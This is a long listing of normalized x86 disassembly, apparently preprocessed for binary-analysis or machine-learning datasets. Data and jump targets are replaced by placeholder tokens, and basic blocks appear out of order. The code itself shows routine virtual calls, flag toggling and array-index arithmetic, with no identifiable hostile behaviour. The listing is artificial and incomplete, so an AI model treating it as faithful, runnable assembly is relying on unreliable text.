push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
push r--data
lea ecx [ ebp + 0x70c ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
mov [ esp + 0x94 ] 0x5
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x24 ] eax
mov [ esp + 0x94 ] 0x6
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push ebx
call eax
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov [ esp + 0x1f ] 0x1
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov [ esp + 0x1f ] 0x1
mov eax [ rw-data ]
lea edi [ ebp + 0xbc8 ]
mov [ edi + 0x38 ] eax
call sub_422a00
mov esi [ esp + 0x2c ]
push esi
push edi
call sub_41ff60
mov eax [ edi + 0x4 ]
mov ecx eax
and ecx 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
mov ecx [ ebp + 0x17c ]
mov edx [ ecx + edi + 0x90 ]
push r--data
push edx
push r--data
lea edi [ esp + 0x24 ]
call sub_412480
add esp 0xc
call sub_4407b7
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
push r--data
lea ecx [ ebp + 0x760 ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x2c ]
call sub_4228c0
mov [ esp + 0x94 ] 0x18
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push ebx
call eax
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
push r--data
lea ecx [ ebp + 0x70c ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x34 ]
call sub_4228c0
mov [ esp + 0x94 ] 0x12
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push ebx
call eax
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
mov [ esp + 0x94 ] 0xb
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x24 ] eax
mov [ esp + 0x94 ] 0xc
mov eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] edi
jae r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push ebx
call eax
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
push r--data
lea eax [ ebp + 0x70c ]
push eax
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x40 ]
call sub_4228c0
mov eax 0x8
mov [ esp + 0x94 ] al
cmp [ esp + 0x64 ] eax
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x30 ]
call sub_412480
mov ecx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] ecx
call sub_422a00
mov edx [ esp + 0x24 ]
push edx
push ebx
call sub_41ff60
lea ecx [ esp + 0x24 ]
jmp r-xdata
lea eax [ esp + 0x50 ]
mov ecx [ esi + 0xc ]
mov edx [ edi + ecx + 0x90 ]
push r--data
push edx
push r--data
lea edi [ esp + 0x38 ]
call sub_412480
add esp 0xc
call sub_4407b7
mov ecx [ ebp + 0x17c ]
mov edx [ edi + ecx + 0x90 ]
push r--data
push edx
push r--data
lea edi [ esp + 0x24 ]
call sub_412480
add esp 0xc
call sub_4407b7
lea eax [ esi - 0x10 ]
mov [ esp + 0x94 ] 0x20
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ edi + 0x1c ]
or eax 0x1
mov [ edi + 0x4 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
push r--data
lea ecx [ ebp + 0x760 ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x20 ]
call sub_4228c0
mov [ esp + 0x94 ] 0x1a
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x38 ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x2c ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x2c ]
jmp r-xdata
lea eax [ esp + 0x50 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
push r--data
lea ecx [ ebp + 0x70c ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x3c ]
call sub_4228c0
mov [ esp + 0x94 ] 0x14
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x40 ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x34 ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x34 ]
jmp r-xdata
lea eax [ esp + 0x50 ]
mov edi [ esp + 0x28 ]
lea esi [ ebp + 0x170 ]
call sub_40f5a0
mov ecx eax
add ecx 0x74
mov esi r--data
call sub_412330
test al al
je r-xdata
push r--data
lea ecx [ ebp + 0x6b8 ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x44 ]
call sub_4228c0
mov [ esp + 0x94 ] 0xe
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x30 ]
call sub_412480
mov ecx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] ecx
call sub_422a00
mov edx [ esp + 0x24 ]
push edx
push ebx
call sub_41ff60
push r--data
lea eax [ ebp + 0x6b8 ]
push eax
call sub_41ff60
lea ecx [ esp + 0x24 ]
jmp r-xdata
lea eax [ esp + 0x50 ]
lea edx [ ebp + 0x70c ]
jmp r-xdata
push r--data
lea eax [ ebp + 0x70c ]
push eax
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x48 ]
call sub_4228c0
mov [ esp + 0x94 ] 0xa
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x4c ]
call sub_412480
mov ecx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] ecx
call sub_422a00
mov edx [ esp + 0x40 ]
push edx
push ebx
call sub_41ff60
lea ecx [ esp + 0x40 ]
jmp r-xdata
lea eax [ esp + 0x50 ]
call sub_422900
lea esi [ esp + 0x4c ]
mov [ esp + 0x94 ] 0x1
call sub_429950
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push edi
call eax
mov eax [ ebp + 0x17c ]
add eax ebx
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0x8
call sub_4298e0
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
test eax eax
mov eax 0x4bda12f7
je r-xdata
call sub_4407b7
lea edx [ ebp + 0x760 ]
push r--data
lea ecx [ ebp + 0x760 ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x18 ]
call sub_4228c0
mov [ esp + 0x94 ] 0x1c
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x2c ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x20 ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x20 ]
jmp r-xdata
lea eax [ esp + 0x50 ]
call sub_422900
lea esi [ esp + 0x4c ]
mov [ esp + 0x94 ] 0x1
call sub_429950
push r--data
lea ecx [ ebp + 0x70c ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x30 ]
call sub_4228c0
mov [ esp + 0x94 ] 0x16
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x48 ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x3c ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x3c ]
jmp r-xdata
lea eax [ esp + 0x50 ]
lea edx [ ebp + 0x6b8 ]
jmp r-xdata
push r--data
lea ecx [ ebp + 0x6b8 ]
push ecx
call sub_41ff60
mov eax r--data
lea ecx [ esp + 0x4c ]
call sub_428a60
lea esi [ esp + 0x38 ]
call sub_4228c0
mov [ esp + 0x94 ] 0x10
cmp [ esp + 0x64 ] 0x8
mov eax [ esp + 0x50 ]
jae r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x50 ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x44 ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x44 ]
jmp r-xdata
lea eax [ esp + 0x50 ]
call sub_422900
lea esi [ esp + 0x4c ]
mov [ esp + 0x94 ] 0x1
call sub_429950
mov eax [ edx + 0x4 ]
test al 0x1
jne r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x54 ]
call sub_412480
mov ecx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] ecx
call sub_422a00
mov edx [ esp + 0x48 ]
push edx
push ebx
call sub_41ff60
lea ecx [ esp + 0x48 ]
lea eax [ esp + 0x50 ]
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
inc esi
add ecx edx
add ebx 0xd8
cmp esi ecx
jb r-xdata
mov ecx [ edx + 0x1c ]
or eax 0x1
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
push eax
push r--data
push r--data
lea edi [ esp + 0x24 ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x18 ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x18 ]
lea eax [ esp + 0x50 ]
push eax
push r--data
push r--data
lea edi [ esp + 0x3c ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x30 ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x30 ]
jmp r-xdata
lea eax [ esp + 0x50 ]
push eax
push r--data
push r--data
lea edi [ esp + 0x44 ]
call sub_412480
mov edx [ rw-data ]
add esp 0xc
mov edi ebx
mov [ ebx + 0x38 ] edx
call sub_422a00
mov eax [ esp + 0x38 ]
push eax
push ebx
call sub_41ff60
lea ecx [ esp + 0x38 ]
lea eax [ esp + 0x50 ]
mov ecx [ ebp + 0x17c ]
mov edi esi
imul edi edi 0xd8
cmp [ ecx + edi + 0x90 ] 0x0
je r-xdata
call sub_4407b7
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ ebp + 0x180 ]
sub ecx [ ebp + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov [ esp + 0x1f ] 0x1
mov ecx [ ebp + 0x17c ]
mov edx [ edi + ecx + 0x90 ]
push r--data
push edx
push r--data
lea edi [ esp + 0x38 ]
call sub_412480
add esp 0xc
call sub_4407b7
sub_40d210
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
mov eax [ esi + 0x58 ]
lea edx [ esi + 0x54 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0xac ]
lea edx [ esi + 0xa8 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ esi + 0x100 ]
lea edx [ esi + 0xfc ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
mov ecx [ esi + 0x1c ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
test edi edi
jne r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x2bc ]
lea edx [ esi + 0x2b8 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
mov eax [ esi + 0x130 ]
lea edx [ esi + 0x12c ]
test al 0x1
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x2ec ]
lea edx [ esi + 0x2e8 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x160 ]
lea edx [ esi + 0x15c ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x324 ]
lea edx [ esi + 0x320 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ esi + 0x190 ]
lea edx [ esi + 0x18c ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
push 0x1
push edi
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0x35c ]
lea edx [ esi + 0x358 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x1c0 ]
lea edx [ esi + 0x1bc ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
retn
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x214 ]
lea edx [ esi + 0x210 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x268 ]
lea edx [ esi + 0x264 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
sub_40d4e0
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
mov eax [ esi + 0x34 ]
lea edx [ esi + 0x30 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0xa4 ]
lea edx [ esi + 0xa0 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ esi + 0xe0 ]
lea edx [ esi + 0xdc ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
mov ecx [ esi + 0x1c ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
test edi edi
jne r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x304 ]
lea edx [ esi + 0x300 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
mov eax [ esi + 0x118 ]
lea edx [ esi + 0x114 ]
test al 0x1
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x358 ]
lea edx [ esi + 0x354 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x148 ]
lea edx [ esi + 0x144 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x3ac ]
lea edx [ esi + 0x3a8 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ esi + 0x178 ]
lea edx [ esi + 0x174 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
push 0x1
push edi
push edx
mov edx [ eax + 0x28 ]
call edx
retn
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x1a8 ]
lea edx [ esi + 0x1a4 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x1fc ]
lea edx [ esi + 0x1f8 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x250 ]
lea edx [ esi + 0x24c ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0x2a4 ]
lea edx [ esi + 0x2a0 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0x2d4 ]
lea edx [ esi + 0x2d0 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
sub_40d7c0
mov eax [ esi + 0x348 ]
lea edx [ esi + 0x344 ]
test al 0x1
je r-xdata
mov eax [ esi + 0x39c ]
lea edx [ esi + 0x398 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0x34 ]
lea edx [ esi + 0x30 ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
test edi edi
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ esi + 0x310 ]
lea edx [ esi + 0x30c ]
mov ecx eax
and ecx 0x1
cmp ecx edi
je r-xdata
mov eax [ esi + 0x214 ]
lea edx [ esi + 0x210 ]
test al 0x1
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
mov ecx [ esi + 0x1c ]
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
retn
test edi edi
je r-xdata
mov eax [ esi + 0x268 ]
lea edx [ esi + 0x264 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
and eax 0xfffffffe
or eax 0x1
jmp r-xdata
mov eax [ esi + 0x2bc ]
lea edx [ esi + 0x2b8 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
push 0x1
push edi
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x88 ]
lea edx [ esi + 0x84 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0xb8 ]
lea edx [ esi + 0xb4 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0xe8 ]
lea edx [ esi + 0xe4 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0x118 ]
lea edx [ esi + 0x114 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0x16c ]
lea edx [ esi + 0x168 ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov eax [ esi + 0x1c0 ]
lea edx [ esi + 0x1bc ]
test al 0x1
je r-xdata
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
mov ecx [ edx + 0x1c ]
and eax 0xfffffffe
mov [ edx + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
